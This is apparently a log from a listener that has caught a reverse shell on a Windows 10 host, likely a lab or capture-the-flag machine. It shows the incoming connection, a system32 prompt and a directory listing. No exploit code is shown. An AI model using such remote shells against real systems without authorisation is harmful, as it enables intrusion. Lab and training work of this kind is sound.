Connection from 10.10.10.27:49739
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>dir
 Volume in drive C has no label.
 Volume Serial Number is CE13-2325

 Directory of C:\Windows\system32

01/19/2020  04:10 PM    <DIR>          .
01/19/2020  04:10 PM    <DIR>          ..
09/15/2018  02:06 AM    <DIR>          0409
01/19/2020  04:09 PM    <DIR>          1033
09/15/2018  12:09 AM             2,151 12520437.cpx
09/15/2018  12:09 AM             2,233 12520850.cpx
09/15/2018  12:09 AM           394,240 AcLayers.dll
09/15/2018  12:09 AM         5,384,704 aclui.dll
09/15/2018  12:09 AM           219,648 activeds.dll
09/15/2018  12:09 AM           112,128 activeds.tlb
09/15/2018  12:09 AM           271,360 actxprxy.dll
09/15/2018  12:10 AM            32,256 AcWinRT.dll
09/15/2018  12:09 AM            37,888 acwow64.dll
09/15/2018  12:09 AM            87,040 AcXtrnal.dll
09/15/2018  12:09 AM           429,056 AdmTmpl.dll
09/15/2018  12:10 AM            49,152 adprovider.dll
09/15/2018  12:09 AM           199,680 adsldp.dll
09/15/2018  12:09 AM           208,896 adsldpc.dll
09/15/2018  12:09 AM            84,992 adsmsext.dll
09/15/2018  12:09 AM           288,256 adsnt.dll
09/15/2018  12:09 AM             2,560 adtschema.dll
09/15/2018  12:12 AM    <DIR>          AdvancedInstallers
09/15/2018  12:09 AM           507,400 advapi32.dll
09/15/2018  12:09 AM             2,560 advapi32res.dll
09/15/2018  12:09 AM           120,832 advpack.dll
09/15/2018  12:09 AM           379,920 aepic.dll
09/15/2018  12:10 AM           163,328 altspace.dll
09/15/2018  12:09 AM           624,640 apphelp.dll
09/15/2018  12:09 AM           294,912 AppIdPolicyEngineApi.dll
09/15/2018  12:09 AM           160,768 appmgmts.dll
09/15/2018  12:09 AM           370,688 appmgr.dll
09/15/2018  12:10 AM           274,432 AppxAllUserStore.dll
09/15/2018  12:10 AM             3,022 AppxProvisioning.xml
09/15/2018  12:12 AM    <DIR>          ar-SA
09/15/2018  12:09 AM            22,528 ARP.EXE
09/15/2018  12:10 AM            29,344 aspnet_counters.dll
09/15/2018  12:09 AM            75,264 asycfilt.dll
09/15/2018  12:09 AM            25,088 at.exe
09/15/2018  12:09 AM            80,896 atl.dll
09/15/2018  12:09 AM            38,912 atmlib.dll
09/15/2018  12:09 AM            19,456 attrib.exe
09/15/2018  12:09 AM           219,136 AuditNativeSnapIn.dll
09/15/2018  12:09 AM            28,672 auditpol.exe
09/15/2018  12:09 AM            55,296 auditpolcore.dll
09/15/2018  12:09 AM            57,344 AuditPolicyGPInterop.dll
09/15/2018  12:09 AM            95,744 auditpolmsg.dll
09/15/2018  12:09 AM           361,984 authfwcfg.dll
09/15/2018  12:09 AM           420,864 authui.dll
09/15/2018  12:09 AM           185,856 authz.dll
09/15/2018  12:09 AM           871,424 autochk.exe
09/15/2018  12:09 AM           852,480 autoconv.exe
09/15/2018  12:09 AM           830,976 autofmt.exe
09/15/2018  12:10 AM           779,776 azroles.dll
09/15/2018  12:10 AM            25,088 AzSqlExt.dll
09/15/2018  12:10 AM           180,536 basecsp.dll
09/15/2018  12:09 AM           104,984 bcd.dll
09/15/2018  12:09 AM           279,416 BCP47Langs.dll
09/15/2018  12:09 AM           112,256 BCP47mrm.dll
09/15/2018  12:09 AM            96,760 bcrypt.dll
09/15/2018  12:09 AM           398,208 bcryptprimitives.dll
09/15/2018  12:12 AM    <DIR>          bg-BG
09/15/2018  12:09 AM            25,088 bitsperf.dll
09/15/2018  12:09 AM            47,616 BitsProxy.dll
